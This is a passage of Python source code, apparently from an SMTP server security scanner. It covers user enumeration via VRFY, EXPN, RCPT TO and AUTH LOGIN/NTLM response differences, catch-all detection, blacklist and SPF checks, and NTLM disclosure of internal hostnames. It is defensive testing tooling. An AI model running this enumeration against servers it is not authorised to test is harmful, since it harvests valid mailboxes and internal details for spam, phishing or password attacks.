                    conn.docmd("EHLO", f"{self.fqdn}")
                    if supports_smtputf8:
                        conn.command_encoding = "utf-8"
                except Exception:
                    return
                while True:
                    user = user_queue.get()
                    if user is None:
                        user_queue.task_done()
                        break
                    try:
                        status, reply = conn.docmd(method, user)
                    except (smtplib.SMTPServerDisconnected, ConnectionResetError, OSError):
                        try:
                            conn = self.get_smtp_handler()
                            conn.docmd("EHLO", f"{self.fqdn}")
                            if supports_smtputf8:
                                conn.command_encoding = "utf-8"
                            status, reply = conn.docmd(method, user)
                        except Exception:
                            user_queue.task_done()
                            continue
                    if status != 550:
                        user_email = re.findall(r"<(.*?)>", self.bytes_to_str(reply))
                        if user_email:
                            with result_lock:
                                enumerated_users.extend(user_email)
                                self.ptdebug(user_email[0])
                    user_queue.task_done()

            threads_list = [threading.Thread(target=worker) for _ in range(enum_threads)]
            for t in threads_list:
                t.start()
            for t in threads_list:
                t.join()
            total_aliases = 0

        additional_message = (
            f"(total {len(enumerated_users) + (total_aliases or 0)} with aliases)"
            if method == "EXPN"
            else ""
        )
        self.ptdebug(f" ")
        self.ptdebug(f"-- Enumerated {len(enumerated_users)} emails {additional_message} --")
        self.ptdebug(f" ")

        self.already_enumerated = True
        return enumerated_users

    @staticmethod
    def _is_rbl_blocked(reply_text: str) -> bool:
        """Return True when a 5xx reply indicates the client IP is blocked by RBL
        (e.g. Spamhaus, SpamCop). Server rejected before the test could run."""
        up = reply_text.upper()
        RBL_INDICATORS = (
            "LISTED AT", "BLACKLIST", "ON BLACKLIST", "RBL", "ZEN.SPAMHAUS",
            "BLOCKED", "SPAMHAUS",  # e.g. "blocked using sbl.spamhaus.org"
        )
        return any(kw in up for kw in RBL_INDICATORS)

    @staticmethod
    def _is_admin_prohibition(reply_text: str) -> bool:
        """Return True when a 5xx VRFY/EXPN reply indicates an administrative
        block rather than a per-user differentiation response.
        These rejections mean the command is disabled by policy."""
        up = reply_text.upper()
        ADMIN_KEYWORDS = (
            "ADMINISTRATIVE PROHIBITION",
            "DISABLED",
            "NOT ALLOWED",
            "NOT PERMITTED",
            "COMMAND REJECTED",
            "COMMAND NOT ACCEPTED",
            "COMMAND DISABLED",
            "ACCESS DENIED",
        )
        return any(kw in up for kw in ADMIN_KEYWORDS)

    def expn_vrfy_test(self, method, smtp) -> bool:
        """Test VRFY/EXPN for user enumeration (OWASP WSTG-IDEN-003).
        RFC 5321: 250/251/252=success, 550/551=user unknown.

        Vulnerable when server returns 550/551 for invalid user AND the response
        indicates a per-user decision (user unknown, etc.).
        NOT vulnerable when the response indicates an administrative prohibition
        (command disabled by policy) -- these are false positives for customer reports."""
        INVALID_PROBES = ("foofoofoo", "nxuser001", "nxuser002")
        VRFY_EXPN_ACCEPT = (250, 251, 252)
        VRFY_EXPN_REJECT = (550, 551, 553, 554)

        replies: list[tuple[int, str]] = []
        for probe in INVALID_PROBES:
            try:
                status, reply = smtp.docmd(method, probe)
                reply_str = self.bytes_to_str(reply)
                replies.append((status, reply_str))
                if "AUTH" in reply_str.upper():
                    self.ptdebug(f"Testing {method} method: server requires AUTH", Out.INFO)
                    self._enum_test_replies = getattr(self, "_enum_test_replies", {})
                    self._enum_test_replies[method.lower()] = f"[{status}] {reply_str.strip()} (Administrative prohibition)"
                    return False
            except Exception as e:
                self.ptdebug(f"Testing {method} method: {e}", Out.INFO)
                return False

        first_status, first_reply = replies[0]
        self.ptdebug(f"Testing {method} method: [{first_status}] {first_reply}", Out.INFO)

        # Uniform response (all 250) = cannot enumerate (catch-all or misconfigured)
        if all(s in VRFY_EXPN_ACCEPT for s, _ in replies):
            self.ptdebug(
                f"Server returns 250 for all invalid addresses - cannot reliably enumerate ({method})",
                Out.INFO,
            )
            return False

        # Find the first 5xx rejection for analysis
        first_reject = next(
            ((s, r) for s, r in replies if s in VRFY_EXPN_REJECT),
            None,
        )

        self._enum_test_replies = getattr(self, "_enum_test_replies", {})

        if first_reject is None:
            # No 5xx at all (e.g. all 4xx or 502 not implemented) -- not vulnerable
            self.ptdebug(f"Server is not vulnerable to {method} enumeration", Out.INFO)
            return False

        rej_status, rej_text = first_reject
        reject_reply = f"[{rej_status}] {rej_text.strip()}"

        # RBL block = server rejected client IP before test could run (not a vulnerability)
        if rej_status in (550, 554) and self._is_rbl_blocked(rej_text):
            self.ptdebug(f"{method} blocked by RBL (could not test): {reject_reply}", Out.INFO)
            self._enum_test_replies[method.lower()] = reject_reply
            self._enum_blocked_by_rbl = getattr(self, "_enum_blocked_by_rbl", set())
            self._enum_blocked_by_rbl.add(method.lower())
            return False

        # Administrative prohibition = command blocked by policy, NOT per-user differentiation
        if self._is_admin_prohibition(rej_text):
            self.ptdebug(
                f"{method} blocked by administrative policy: {reject_reply}",
                Out.INFO,
            )
            self._enum_test_replies[method.lower()] = f"{reject_reply} (Administrative prohibition)"
            return False

        # Genuine per-user rejection (user unknown, etc.) = enumeration possible
        self._enum_test_replies[method.lower()] = reject_reply
        self.ptdebug(f"Server is vulnerable to {method} enumeration: {reject_reply}", Out.VULN)
        return True

    def newline_to_reply(self, reply):
        reply = self.bytes_to_str(reply)
        if not reply.endswith("\n"):
            reply += "\n"
        return reply

    @staticmethod
    def _is_relay_or_auth_rejection(reply_text: str) -> bool:
        """Return True when a 5xx reply indicates a global relay/auth policy
        rather than a per-recipient user-unknown decision.
        These rejections do NOT prove user enumeration."""
        up = reply_text.upper()
        RELAY_KEYWORDS = (
            "RELAY", "RELAYING", "NOT PERMITTED", "NOT ALLOWED",
            "AUTHENTICATION REQUIRED", "AUTH REQUIRED",
            "IS NOT LOCAL", "NOT LOCAL",
            "SENDER VERIFY", "SENDER REJECTED",
        )
        return any(kw in up for kw in RELAY_KEYWORDS)

    def rcpt_test(self, smtp) -> bool:
        """RCPT enum vulnerability (OWASP WSTG-IDEN-003).
        Uses full addresses <probe@domain> so the server evaluates them against its
        virtual mailbox / alias tables.  RFC 5321: 250/251=accepted, 550/551=rejected.

        Vulnerable when server returns 550/551/553/554 for invalid recipients AND
        the response text indicates a per-recipient decision (user unknown, mailbox
        not found, etc.) -- NOT a global relay/auth policy rejection."""
        RCPT_ACCEPT = (250, 251, 252)
        RCPT_REJECT = (550, 551, 553, 554)
        INVALID_PROBES = ("foofoofoo", "nxuser001", "nxuser002")

        domain = self._get_rcpt_limit_domain()
        self.ptdebug(f"Testing RCPT method with domain: {domain}", Out.INFO)

        # Ensure clean SMTP state (previous test_catchall may have left an open transaction)
        try:
            smtp.docmd("RSET")
        except Exception:
            pass

        try:
            status, reply = smtp.docmd("MAIL FROM:", "<mail@from.me>")
            if status not in RCPT_ACCEPT:
                self.ptdebug(f"Testing RCPT method: MAIL FROM rejected [{status}]", Out.INFO)
                return False
        except Exception as e:
            self.ptdebug(f"Testing RCPT method: {e}", Out.INFO)
            return False

        replies: list[tuple[int, str]] = []
        for probe in INVALID_PROBES:
            try:
                status, reply = smtp.docmd("RCPT TO:", f"<{probe}@{domain}>")
                reply_str = self.bytes_to_str(reply)
                replies.append((status, reply_str))
                if "AUTH" in reply_str.upper():
                    self.ptdebug(f"Testing RCPT method: [{status}] server requires AUTH", Out.INFO)
                    self._enum_test_replies = getattr(self, "_enum_test_replies", {})
                    self._enum_test_replies["rcpt"] = f"[{status}] {reply_str.strip()} (Relay protection active)"
                    return False
            except Exception as e:
                self.ptdebug(f"Testing RCPT method: {e}", Out.INFO)
                return False

        first_status, first_reply = replies[0]
        self.ptdebug(f"Testing RCPT method: [{first_status}] {first_reply}")

        # Uniform 250 for all invalid = cannot enumerate (catch-all or accept-all)
        if all(s in RCPT_ACCEPT for s, _ in replies):
            self.ptdebug(
                "Server returns 250 for all invalid addresses - cannot reliably enumerate (RCPT)",
                Out.INFO,
            )
            return False

        # Find the first 5xx rejection for analysis
        first_reject = next(
            ((s, r) for s, r in replies if s in RCPT_REJECT),
            None,
        )

        self._enum_test_replies = getattr(self, "_enum_test_replies", {})

        if first_reject is None:
            # No 5xx at all (e.g. all 4xx) -- inconclusive
            self.ptdebug("Server is not vulnerable to RCPT enumeration", Out.NOTVULN)
            return False

        rej_status, rej_text = first_reject
        reject_reply = f"[{rej_status}] {rej_text.strip()}"

        # RBL block = server rejected client IP before test could run (not a vulnerability)
        if rej_status in (550, 554) and self._is_rbl_blocked(rej_text):
            self.ptdebug(f"RCPT blocked by RBL (could not test): {reject_reply}", Out.INFO)
            self._enum_test_replies["rcpt"] = reject_reply
            self._enum_blocked_by_rbl = getattr(self, "_enum_blocked_by_rbl", set())
            self._enum_blocked_by_rbl.add("rcpt")
            return False

        # Relay / auth policy rejection = global block, NOT per-user differentiation
        if self._is_relay_or_auth_rejection(rej_text):
            self.ptdebug(
                f"RCPT rejected by relay/auth policy, not user-based: {reject_reply}",
                Out.INFO,
            )
            self._enum_test_replies["rcpt"] = f"{reject_reply} (Relay protection active)"
            return False

        # Genuine per-recipient rejection (user unknown, mailbox not found, etc.)
        self._enum_test_replies["rcpt"] = reject_reply
        self.ptdebug(f"Server is vulnerable to RCPT enumeration: {reject_reply}", Out.VULN)
        return True

    def test_catchall(self, smtp: smtplib.SMTP) -> CatchAllResult:
        """
        Detect Catch-All mailbox: if server accepts 3 invalid addresses as valid,
        catch-all is configured (VRFY/EXPN) or indeterminate (RCPT).
        Uses VRFY or EXPN when available; otherwise RCPT. RCPT cannot distinguish
        valid address from catch-all, so result is Indeterminate when all accepted.
        Per RFC 5321: 250/251/252 are success for VRFY/EXPN; 550 = user unknown.
        OWASP: RCPT uses full addresses (local@domain) for robustness.
        """
        CATCHALL_INVALID = ("catchallnx001", "catchallnx002", "catchallnx003")
        VRFY_EXPN_ACCEPT = (250, 251, 252)
        domain = self._get_rcpt_limit_domain()

        def _choose_method() -> str | None:
            if self.results.enum_results:
                for e in self.results.enum_results:
                    if e.vulnerable and e.method in ("expn", "vrfy", "rcpt"):
                        return e.method
            try:
                status, _ = smtp.docmd("VRFY", "catchallprobe")
                if status in (*VRFY_EXPN_ACCEPT, 550):
                    return "vrfy"
            except Exception:
                pass
            try:
                status, _ = smtp.docmd("EXPN", "catchallprobe")
                if status in (*VRFY_EXPN_ACCEPT, 550):
                    return "expn"
            except Exception:
                pass
            try:
                smtp.docmd("MAIL FROM:", "<>")
                status, _ = smtp.docmd("RCPT TO:", f"<catchallprobe@{domain}>")
                if status in (250, 251, 252, 550):
                    return "rcpt"
            except Exception:
                pass
            return None

        try:
            method = _choose_method()
            if not method:
                return "indeterminate"

            if method in ("vrfy", "expn"):
                cmd = "VRFY" if method == "vrfy" else "EXPN"
                accepted = 0
                for user in CATCHALL_INVALID:
                    try:
                        status, _ = smtp.docmd(cmd, user)
                        if status in VRFY_EXPN_ACCEPT:
                            accepted += 1
                        elif status in (550, 551, 553, 554):
                            return "not_configured"
                    except (smtplib.SMTPServerDisconnected, ConnectionResetError, OSError):
                        return "indeterminate"
                return "configured" if accepted == 3 else "indeterminate"

            else:
                # _choose_method may have issued MAIL FROM when probing RCPT; reset first
                try:
                    smtp.docmd("RSET")
                except Exception:
                    pass
                try:
                    smtp.docmd("MAIL FROM:", "<>")
                except Exception:
                    return "indeterminate"
                try:
                    for user in CATCHALL_INVALID:
                        try:
                            status, reply = smtp.docmd("RCPT TO:", f"<{user}@{domain}>")
                            if status in (550, 551, 553, 554) or "UNKNOWN" in self.bytes_to_str(reply).upper():
                                return "not_configured"
                        except (smtplib.SMTPServerDisconnected, ConnectionResetError, OSError):
                            return "indeterminate"
                    return "indeterminate"
                finally:
                    try:
                        smtp.docmd("RSET")
                    except Exception:
                        pass
        except Exception:
            return "indeterminate"

    def rcpt_enumeration(self, smtp) -> list[str]:
        enum_threads = getattr(self.args, "enum_threads", 1)
        ehlo = (self.results.info and self.results.info.ehlo) or ""
        supports_smtputf8 = "SMTPUTF8" in ehlo.upper()
        domain = self._get_rcpt_limit_domain()
        if getattr(self, "_wordlist_skipped", 0) > 0:
            self.ptdebug(
                f"Skipped {self._wordlist_skipped} invalid local parts from wordlist",
                Out.INFO,
            )
        self.ptdebug(f"Enumerating users (domain: {domain}):" + (f" ({enum_threads} threads)" if enum_threads > 1 else ""), Out.INFO)
        enumerated_users: list[str] = []

        def _skip(local: str) -> bool:
            return not supports_smtputf8 and any(ord(c) >= 128 for c in local)

        if enum_threads <= 1:
            if supports_smtputf8:
                smtp.command_encoding = "utf-8"
            for user in self.wordlist:
                local = user.split("@")[0].strip()
                if _skip(local):
                    continue
                try:
                    status, reply = smtp.docmd("RCPT TO:", f"<{local}@{domain}>")
                except (smtplib.SMTPServerDisconnected, ConnectionResetError, OSError) as e:
                    self.ptdebug(
                        f"RCPT enumeration interrupted (connection closed/reset): {e}",
                        Out.INFO,
                    )
                    try:
                        smtp = self.get_smtp_handler()
                        smtp.docmd("EHLO", f"{self.fqdn}")
                        if supports_smtputf8:
                            smtp.command_encoding = "utf-8"
                        smtp.docmd("MAIL FROM:", "<mail@from.me>")
                        status, reply = smtp.docmd("RCPT TO:", f"<{local}@{domain}>")
                    except Exception:
                        break
                if status != 550 and not "UNKNOWN" in self.bytes_to_str(reply).upper():
                    enumerated_users.append(local)
                    self.ptdebug(local)
        else:
            locals_to_try = [u.split("@")[0].strip() for u in self.wordlist if not _skip(u.split("@")[0].strip())]
            user_queue: queue.Queue[str | None] = queue.Queue()
            for local in locals_to_try:
                user_queue.put(local)
            for _ in range(enum_threads):
                user_queue.put(None)
            result_lock = threading.Lock()

            def rcpt_worker() -> None:
                try:
                    conn = self.get_smtp_handler()
                    conn.docmd("EHLO", f"{self.fqdn}")
                    if supports_smtputf8:
                        conn.command_encoding = "utf-8"
                    conn.docmd("MAIL FROM:", "<mail@from.me>")
                except Exception:
                    return
                while True:
                    local = user_queue.get()
                    if local is None:
                        user_queue.task_done()
                        break
                    try:
                        status, reply = conn.docmd("RCPT TO:", f"<{local}@{domain}>")
                    except (smtplib.SMTPServerDisconnected, ConnectionResetError, OSError):
                        try:
                            conn = self.get_smtp_handler()
                            conn.docmd("EHLO", f"{self.fqdn}")
                            if supports_smtputf8:
                                conn.command_encoding = "utf-8"
                            conn.docmd("MAIL FROM:", "<mail@from.me>")
                            status, reply = conn.docmd("RCPT TO:", f"<{local}@{domain}>")
                        except Exception:
                            user_queue.task_done()
                            continue
                    if status != 550 and not "UNKNOWN" in self.bytes_to_str(reply).upper():
                        with result_lock:
                            enumerated_users.append(local)
                            self.ptdebug(local)
                    user_queue.task_done()

            threads_list = [threading.Thread(target=rcpt_worker) for _ in range(enum_threads)]
            for t in threads_list:
                t.start()
            for t in threads_list:
                t.join()

        self.ptdebug(f" ")
        self.ptdebug(f"-- Enumerated {len(enumerated_users)} users --")
        self.ptdebug(f" ")

        self.already_enumerated = True
        return enumerated_users

    def bytes_to_str(self, text):
        return text.decode("utf-8")

    # RFC 5322 atext (atom text) + dot; RFC 6531 allows Unicode letters/digits in local part
    _ATEXT_ASCII = set("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%&'*+-/=?^_`{|}~.")

    @classmethod
    def _is_valid_local_part(cls, s: str) -> bool:
        """True if s is a valid email local part (RFC 5322 atext / dot-atom, RFC 6531 Unicode)."""
        if not s or len(s) > 64:
            return False
        if s[0] == "." or s[-1] == "." or ".." in s:
            return False
        for c in s:
            if c in cls._ATEXT_ASCII:
                continue
            if ord(c) < 128:
                return False
            cat = unicodedata.category(c)
            if cat not in ("Ll", "Lu", "Lm", "Lo", "Lt", "Nl", "Nd"):
                return False
        return True

    def test_blacklist(self, target: str) -> tuple[BlacklistResult | None, bool]:
        """Run blacklist check. Returns (result, skipped_private). skipped_private=True for private IP (no API call)."""
        self.ptdebug("Testing target against blacklists:", title=True)
        if self.target_is_ip and _is_private_ip(target):
            self.ptdebug("Blacklist test skipped: private/internal IP (not on public blacklists)", Out.INFO)
            return (None, True)

        blacklist_parser = BlacklistParser(self.ptdebug, self.args.json)

        try:
            error_msg = blacklist_parser.lookup(target)
        except Exception as e:
            self._fail(str(e))

        if error_msg:
            self.ptdebug(error_msg, Out.VULN)
            # API returned "Cannot test Private IP Address" or similar
            if error_msg == "Cannot test Private IP Address":
                return (None, True)
            # Other error: no result, not "skipped private"
            return (BlacklistResult(False, None), False)

        # Check if result is None or doesn't have the expected structure
        if blacklist_parser.result is None or "table_result" not in blacklist_parser.result:
            return (BlacklistResult(False, None), False)

        listed = [
            BlacklistEntry(r[1], r[2], r[3])
            for r in blacklist_parser.result["table_result"]
            if r[0] == "LISTED"
        ]

        if len(listed) > 0:
            return (BlacklistResult(True, listed), False)
        return (BlacklistResult(False, None), False)

    def _resolver_query(self, resolver, domain, ns, record_type):
        data = resolver.resolve(domain, record_type)
        return [self._rdata_to_str(rdata) for rdata in data]

    def _get_spf_records(self, resolver, domain, ns):
        spf_result = {ns: []}
        try:
            for record in ["SPF", "TXT"]:
                data = resolver.resolve(domain, record)
                for rdata in data:
                    spf_result[ns].append(self._rdata_to_str(rdata))
        except dns.resolver.NoAnswer as e:
            pass
        except dns.resolver.Timeout as e:
            pass
        return spf_result

    def _rdata_to_str(self, rdata):
        str_rdata = str(rdata)
        if str_rdata.startswith('"') and str_rdata.endswith('"'):
            str_rdata = str_rdata[1:-1]
        return str_rdata

    def _get_nameservers(self, domain) -> dict[str, list[str]]:
        self.ptdebug(f"Retrieving SPF records for: {self.target}", title=True)

        resolver = dns.resolver.Resolver()
        resolver.timeout = 10
        resolver.lifetime = 10
        self.ptdebug(f"Retrieving nameservers for domain: {domain}", title=True)
        try:
            ns_query = resolver.resolve(domain, "NS", tcp=True)
            nameserver_list = [str(rdata)[:-1] for rdata in ns_query]
            self.ptdebug("    " + "\n    ".join(nameserver_list))
        except Exception as e:
            # Make error message more user-friendly
            error_msg = str(e)
            if "does not exist" in error_msg or "NXDOMAIN" in error_msg:
                user_msg = f"Domain '{domain}' does not exist in DNS"
            elif "does not contain an answer" in error_msg or "NoAnswer" in str(type(e).__name__):
                # Check if it's a subdomain
                parts = domain.split('.')
                if len(parts) > 2:
                    main_domain = '.'.join(parts[-2:])
                    user_msg = f"Could not retrieve nameservers for '{domain}'. SPF records are usually on the main domain. Try using '{main_domain}' instead."
                else:
                    user_msg = f"Could not retrieve nameservers for '{domain}'. The domain may not have NS records configured."
            else:
                user_msg = f"Error retrieving nameservers for '{domain}': {error_msg}"
            if self.run_all_mode:
                self._fail(user_msg)
            full_msg = f"{user_msg}\n\nUse 'ptsrvtester smtp -h' for help."
            self.ptjsonlib.end_error(full_msg, self.use_json)
            raise SystemExit

        spf_result = {}
        for ns in nameserver_list:
            try:
                ns_ip = socket.gethostbyname(ns)
            except Exception as e:
                self.ptdebug(f"Exception - {e}", Out.ERROR)
                continue
            resolver.nameservers = [ns_ip]
            spf_result.update({ns: []})
            self.ptdebug(f"{ns}:", Out.INFO)
            spf_result[ns].extend(self._get_spf_for_ns(domain, resolver))

        is_spf_difference = self._check_difference_between_ns_response(spf_result)

        results = {ns: val for ns, val in spf_result.items() if len(val) > 0}
        return results

    def _check_difference_between_ns_response(self, result):
        is_difference = False
        for index, value in enumerate(result.values()):
            for index_2, value_2 in enumerate(result.values()):
                if index == index_2:
                    continue
                if value != value_2:
                    is_difference = True
        if is_difference:
            self.ptdebug(f"Different response between nameservers", Out.VULN)
            return True
        else:
            return False

    def _get_spf_for_ns(self, domain, resolver):
        try:
            result = []
            for dns_type in ["TXT", "SPF"]:
                answer = resolver.resolve(domain, dns_type)
                for rdata in answer:
                    rdata = self._rdata_to_str(rdata)
                    if dns_type == "TXT" and not re.search("v=spf1", rdata):
                        continue
                    result.append(rdata)
                    self.ptdebug(rdata)
        except dns.resolver.NoAnswer as e:
            pass
        except dns.resolver.NoNameservers as e:
            # DNS nameservers failed - return empty result
            return []
        except dns.resolver.Timeout as e:
            raise Exception("Timeout error")
        except Exception as e:
            # Catch any other DNS errors
            self.ptdebug(f"DNS error: {e}", Out.ERROR)
            return []
        return result

    def auth_ntlm(self, smtp: smtplib.SMTP) -> NTLMResult:
        """
        Performs NTLM authentication to extract internal server
        information from server's challenge response.
        OWASP: Common finding on MS Exchange - exposes domain/hostname.
        """
        ntlm = None
        try:
            code, resp = smtp.docmd("AUTH NTLM")
            if code == 334:
                smtp.send(b64encode(get_NegotiateMessage_data()) + smtplib.bCRLF)
                code, resp = smtp.getreply()
                ntlm = decode_ChallengeMessage_blob(b64decode(resp))
        except (
            smtplib.SMTPException,
            ValueError,
            TypeError,
            KeyError,
            struct.error,
            UnicodeDecodeError,
        ):
            ntlm = None

        if ntlm is None:
            self.ptdebug(
                f"Server is not vulnerable to information disclosure via NTLM authentication",
                Out.NOTVULN,
            )
            return NTLMResult(False, None)

        self.ptdebug(
            f"Server is vulnerable to information disclosure via NTLM authentication", Out.VULN
        )
        # OWASP: flag internal domain/hostname (common on MS Exchange)
        internal_hints = (
            ".local",
            ".internal",
            ".intranet",
            ".corp",
            ".lan",
            ".localdomain",
            ".private",
            ".priv",
            ".ads",
        )
        domain_str = (ntlm.netbios_domain or "") + (ntlm.dns_domain or "")
        if any(h in (domain_str or "").lower() for h in internal_hints):
            self.ptdebug("  [*] Internal domain/hostname disclosed (common MS Exchange finding)", Out.VULN)
        self.ptdebug(f"  Target name: {ntlm.target_name}")
        self.ptdebug(f"  NetBios domain name: {ntlm.netbios_domain}")
        self.ptdebug(f"  NetBios computer name: {ntlm.netbios_computer}")
        self.ptdebug(f"  DNS domain name: {ntlm.dns_domain}")
        self.ptdebug(f"  DNS computer name: {ntlm.dns_computer}")
        self.ptdebug(f"  DNS tree: {ntlm.dns_tree}")
        self.ptdebug(f"  OS version: {ntlm.os_version}")

        return NTLMResult(True, ntlm)

    AUTH_ENUM_PASSWORD = "PtSrv_Test_!@#_2026"

    def _get_smtp_for_auth_enum(self) -> tuple[smtplib.SMTP, str]:
        """
        Get SMTP connection with AUTH LOGIN/PLAIN available.
        On port 25/587: if plain EHLO lacks LOGIN/NTLM but has STARTTLS, upgrade and re-EHLO.
        """
        smtp = self.get_smtp_handler()
        _, ehlo_bytes = smtp.ehlo(self.fqdn)
        ehlo = ehlo_bytes.decode() if ehlo_bytes else ""

        auth_methods = _get_auth_methods_from_ehlo(ehlo)
        needs_starttls = (
            "LOGIN" not in auth_methods
            and "NTLM" not in auth_methods
            and "STARTTLS" in ehlo.upper()
            and self.args.target.port != 465
            and not self.args.tls
            and not self.args.starttls
        )
        if needs_starttls:
            status, _ = smtp.docmd("STARTTLS")
            if status == 220:
                ctx = ssl._create_unverified_context()
                try:
                    _is_ip = ipaddress.ip_address(self.args.target.ip)
                    server_hostname = None
                except ValueError:
                    server_hostname = self.args.target.ip
                sock_ssl = ctx.wrap_socket(smtp.sock, server_hostname=server_hostname)
                smtp.sock = sock_ssl
                smtp.file = None
                smtp.helo_resp = None
                smtp.ehlo_resp = None
                smtp.esmtp_features = {}
                smtp.does_esmtp = False
                _, ehlo_bytes = smtp.ehlo(self.fqdn)
                ehlo = ehlo_bytes.decode() if ehlo_bytes else ""

        return smtp, ehlo

    def _auth_enum_probe_login_user(self, user: str) -> str | None:
        """One connection: AUTH LOGIN → user → wrong password; return 'code line' or None."""
        conn = None
        try:
            conn, _ = self._get_smtp_for_auth_enum()
            code, resp = conn.docmd("AUTH", "LOGIN")
            if code != 334:
                return None
            code, resp = conn.docmd(b64encode(user.encode()).decode())
            if code >= 500:
                txt = self.bytes_to_str(resp).strip()
                return f"{code} {txt}" if txt else str(code)
            if code == 334:
                code, resp = conn.docmd(b64encode(self.AUTH_ENUM_PASSWORD.encode()).decode())
                if code >= 500:
                    txt = self.bytes_to_str(resp).strip()
                    return f"{code} {txt}" if txt else str(code)
            return None
        except Exception:
            return None
        finally:
            if conn:
                try:
                    conn.close()
                except Exception:
                    pass

    def _auth_enum_probe_ntlm_user(self, user: str) -> str | None:
        """One connection: AUTH NTLM negotiate → user + wrong password; return 'code line' or None."""
        if NtlmContext is None:
            return None
        conn = None
        try:
            conn, _ = self._get_smtp_for_auth_enum()
            code, resp = conn.docmd("AUTH", "NTLM")
            if code != 334:
                return None
            conn.send(b64encode(get_NegotiateMessage_data()) + smtplib.bCRLF)
            code, resp = conn.getreply()
            if code != 334:
                return None
            ctx = NtlmContext(user, self.AUTH_ENUM_PASSWORD)
            type3 = ctx.step(b64decode(resp))
            conn.send(b64encode(type3) + smtplib.bCRLF)
            code, resp = conn.getreply()
            if code >= 500:
                txt = self.bytes_to_str(resp).strip()
                return f"{code} {txt}" if txt else str(code)
            return None
        except Exception:
            return None
        finally:
            if conn:
                try:
                    conn.close()
                except Exception:
                    pass

    def test_auth_enum(self) -> AuthEnumResult:
        """
        Test AUTH user enumeration: server differentiates invalid vs valid user + wrong password.
        Protocol flow: 5xx after username (before password) = vulnerable.
        Response comparison: different 5xx for invalid vs valid+wrong = vulnerable.
        All -u / -w entries are probed; enumerated_users lists those differing from invalid baseline.
        """
        if self.args.user:
            candidates = [self.args.user.strip()]
        else:
            candidates = [u.strip() for u in (self.wordlist or []) if u.strip()]
        if not candidates:
            return AuthEnumResult(
                vulnerable=False,
                indeterminate=True,
                method_tested="",
                protocol_flow_vuln=False,
                invalid_user_responses=[],
                valid_user_response=None,
                enumerated_users=(),
                detail="No valid user (use -u or -w)",
            )

        invalid_users = [
            f"enumtest_invalid_{random.getrandbits(32):08x}",
            f"enumtest_invalid_{random.getrandbits(32):08x}",
        ]

        try:
            _, ehlo = self._get_smtp_for_auth_enum()
        except Exception as e:
            return AuthEnumResult(
                vulnerable=False,
                indeterminate=True,
                method_tested="",
                protocol_flow_vuln=False,
                invalid_user_responses=[],
                valid_user_response=None,
                enumerated_users=(),
                detail=str(e),
            )

        auth_methods = _get_auth_methods_from_ehlo(ehlo)
        method_to_test = "LOGIN" if "LOGIN" in auth_methods else ("NTLM" if "NTLM" in auth_methods else None)
        if not method_to_test:
            return AuthEnumResult(
                vulnerable=False,
                indeterminate=True,
                method_tested="",
                protocol_flow_vuln=False,
                invalid_user_responses=[],
                valid_user_response=None,
                enumerated_users=(),
                detail="Server does not advertise AUTH LOGIN or AUTH NTLM",
            )

        invalid_responses: list[str] = []
        protocol_flow_vuln = False
        enumerated_list: list[str] = []
        valid_response: str | None = None

        def _norm_line(code: int, resp: bytes) -> str:
            txt = self.bytes_to_str(resp).strip()
            return f"{code} {txt}" if txt else str(code)

        if method_to_test == "LOGIN":
            for inv_user in invalid_users:
                try:
                    conn, _ = self._get_smtp_for_auth_enum()
                    code, resp = conn.docmd("AUTH", "LOGIN")
                    if code != 334:
                        try:
                            conn.close()
                        except Exception:
                            pass
                        continue
                    code, resp = conn.docmd(b64encode(inv_user.encode()).decode())
                    if code >= 500:
                        protocol_flow_vuln = True
                        invalid_responses.append(_norm_line(code, resp))
                    elif code == 334:
                        code, resp = conn.docmd(b64encode(self.AUTH_ENUM_PASSWORD.encode()).decode())
                        if code >= 500:
                            invalid_responses.append(_norm_line(code, resp))
                    try:
                        conn.close()
                    except Exception:
                        pass
                except Exception:
                    pass

            inv_normalized = (
                {_normalize_auth_response_for_comparison(r) for r in invalid_responses} if invalid_responses else set()
            )
            for i, cand in enumerate(candidates):
                r = self._auth_enum_probe_login_user(cand)
                if i == 0:
                    valid_response = r
                if i == 0 and r is None:
                    return AuthEnumResult(
                        vulnerable=protocol_flow_vuln,
                        indeterminate=not protocol_flow_vuln and not invalid_responses,
                        method_tested="LOGIN",
                        protocol_flow_vuln=protocol_flow_vuln,
                        invalid_user_responses=invalid_responses,
                        valid_user_response=None,
                        enumerated_users=(),
                        detail=None,
                    )
                if r and inv_normalized and _normalize_auth_response_for_comparison(r) not in inv_normalized:
                    enumerated_list.append(cand)

        elif method_to_test == "NTLM" and NtlmContext is not None:
            for inv_user in invalid_users:
                try:
                    conn, _ = self._get_smtp_for_auth_enum()
                    code, resp = conn.docmd("AUTH", "NTLM")
                    if code != 334:
                        try:
                            conn.close()
                        except Exception:
                            pass
                        continue
                    conn.send(b64encode(get_NegotiateMessage_data()) + smtplib.bCRLF)
                    code, resp = conn.getreply()
                    if code != 334:
                        try:
                            conn.close()
                        except Exception:
                            pass
                        continue
                    ctx = NtlmContext(inv_user, self.AUTH_ENUM_PASSWORD)
                    type3 = ctx.step(b64decode(resp))
                    conn.send(b64encode(type3) + smtplib.bCRLF)
                    code, resp = conn.getreply()
                    if code >= 500:
                        invalid_responses.append(_norm_line(code, resp))
                    try:
                        conn.close()
                    except Exception:
                        pass
                except Exception:
                    pass

            inv_normalized = (
                {_normalize_auth_response_for_comparison(r) for r in invalid_responses} if invalid_responses else set()
            )
            for i, cand in enumerate(candidates):
                r = self._auth_enum_probe_ntlm_user(cand)
                if i == 0:
                    valid_response = r
                if i == 0 and r is None:
                    return AuthEnumResult(
                        vulnerable=False,
                        indeterminate=not invalid_responses,
                        method_tested="NTLM",
                        protocol_flow_vuln=False,
                        invalid_user_responses=invalid_responses,
                        valid_user_response=None,
                        enumerated_users=(),
                        detail=None,
                    )
                if r and inv_normalized and _normalize_auth_response_for_comparison(r) not in inv_normalized:
                    enumerated_list.append(cand)

        elif method_to_test == "NTLM":
            return AuthEnumResult(
                vulnerable=False,
                indeterminate=True,
                method_tested="NTLM",
                protocol_flow_vuln=False,
                invalid_user_responses=[],
                valid_user_response=None,
                enumerated_users=(),
                detail="NTLM test requires ntlm-auth package",
            )

        response_differs = len(enumerated_list) > 0
        vulnerable = protocol_flow_vuln or response_differs
        detail = None
        if protocol_flow_vuln:
            detail = "Server responds 5xx after username (before password challenge)"
        elif response_differs:
            detail = f"Different responses vs invalid baseline; examples: {invalid_responses[:1]} vs {valid_response}"

        return AuthEnumResult(
            vulnerable=vulnerable,
            indeterminate=False,
            method_tested=method_to_test,
            protocol_flow_vuln=protocol_flow_vuln,
